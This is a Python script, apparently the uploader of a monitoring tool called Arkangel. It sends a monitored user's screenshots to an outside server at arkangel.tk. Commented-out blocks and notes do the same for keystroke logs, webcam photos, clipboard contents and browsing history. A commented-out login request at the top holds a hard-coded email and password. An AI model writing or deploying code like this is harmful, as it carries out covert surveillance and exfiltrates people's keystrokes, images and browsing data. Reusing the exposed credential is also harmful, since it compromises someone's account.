import requests
import json
import os
from getsqldata import *
from datetime import datetime
# url = "http://www.arkangel.tk/logginUpload"
# payload = {"email":"minhhuy2197@gmail.com","password":"1234567890"}

# r = requests.post(url, data=payload)

# ct = r.content
# print(ct)

# file = open("key.txt", "wb")
# file.write(ct)
# file.close()

# f = open('key.txt', 'r')
# str= f.read()
# str = str.replace('"','')
# print ('Noi dung file la:\n', str)
uid = getCurrentUser()

st = getRowValue("Setting",uid)
email = getRowValue('Users',uid)[1]
token = getRowValue('current_user',uid)[1]
dir_path = getRowValue('Setting',uid)

keystrokeLogs = datetime.now().strftime('%Y_%m_%d-')+email+'-'+token+'.txt'
file = os.path.join(st[1],keystrokeLogs)

###up keystroke log
##print(file)
##if(os.path.exists(file)):
##    urllogs = "http://www.arkangel.tk/upload-clipboard-log"
##    with open(file,'rb') as filedata:
##        r = requests.post(urllogs, files={'file':filedata})
##        print(r.content)
##        r.closr()
##else:
##    print("No such file or directory!")

###up website log
##websiteLogs = os.path.join(dir_path[5],'Website\\'+datetime.now().strftime('%Y_%m_%d-')+email+'-'+token+'.zip')
##print(websiteLogs)
##if(os.path.exists(websiteLogs)):
##    urlweb = 'http://www.arkangel.tk/upload-web-log'
##    with open(websiteLogs,'rb') as filedata:
##        r = requests.post(urlweb,files={'file':filedata})
##        print(r.content)
##else:
##    print("No such file or directory!")
##

###up webcam image log
##path = os.path.join(dir_path[2],'Webcam\\'+datetime.now().strftime('%Y_%m_%d-%H_%M_%S-')+email+'.jpeg')
##print(path)
##if(os.path.exists(path)):
##    urlweb = 'http://www.arkangel.tk/upload-webcam'
##    with open(path,'rb') as filedata:
##        r = requests.post(urlweb,files={'file':filedata})
##        print(r.content)
##else:
##    print("No such file or directory!")


#up screenshot image log
path = os.path.join(dir_path[3],'Screenshot\\'+datetime.now().strftime('%Y_%m_%d-%H_%M_%S-')+email+'.jpeg')
#path = os.path.join(dir_path[3],'Screenshot\\2018_07_05-09_09_12-abc@gmail.com.jpeg')

if(os.path.exists(path)):
    print(path)
    urlscr = 'http://www.arkangel.tk/upload-screenshot'
    with open(path,'rb') as filedata:
        r = requests.post(urlscr,files={'file':filedata})
        print(r.content)
else:
    print("No such file or directory!")

#upload hìn hảnh screenshot có địa chỉ: http://www.arkangel.tk/upload-sreenchot
#upload hìn hảnh webcam có địa chỉ: http://www.arkangel.tk/upload-webcam
#upload hìn hảnh clipboard có hình có địa chỉ: http://www.arkangel.tk/upload-clipboard-image
#upload log clipboard có log địa chỉ: http://www.arkangel.tk/upload-clipboard-log
#upload .zip web có log địa chỉ: http://www.arkangel.tk/upload-web-log

#CẤU TRÚC FILE
# hình ảnh: năm_tháng_ngày-email.jpeg   token lưu vào author
#log của clipboard: năm_tháng_ngày-email-token.txt
#web: năm_tháng_ngày-email-token.zip

